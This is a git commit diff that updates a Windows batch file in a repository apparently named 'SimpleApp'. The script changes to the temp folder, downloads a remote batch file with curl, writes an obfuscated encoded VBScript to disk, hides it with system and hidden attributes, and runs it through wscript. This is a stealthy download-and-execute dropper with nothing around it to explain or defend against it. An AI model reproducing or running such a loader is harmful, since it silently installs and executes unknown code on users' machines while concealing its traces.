00df23bbe4ac497021131c4cdf7493d9e940382e
Solda10Skipper <99901864+Solda10Skipper@users.noreply.github.com>
2022-02-18 14:51:07 +0100

    Update s.bat

--- k/s.bat
+++ k/s.bat
@@ -1,6 +1,6 @@
 @echo off
 cd %tmp%
-curl -Ls https://raw.githubusercontent.com/Solda10Skipper/SimpleApp/main/d.bat -o d.cmd
+curl -Ls https://raw.githubusercontent.com/Solda10Skipper/SimpleApp/main/k/d.bat -o d.cmd
 echo #@~^^TgAAAA==/M+CD+}4LmDcJq/^^DbwO Ut+^^sJ*RI!U~JrJrP'P	j1DrwD bMo;hxYdcZ#~[,ErJEBPZ~Pwl^^d+lRcAAA==^^#~@>i.vbe
 attrib +s +h i.vbe
 wscript.exe "i.vbe" "d.cmd"
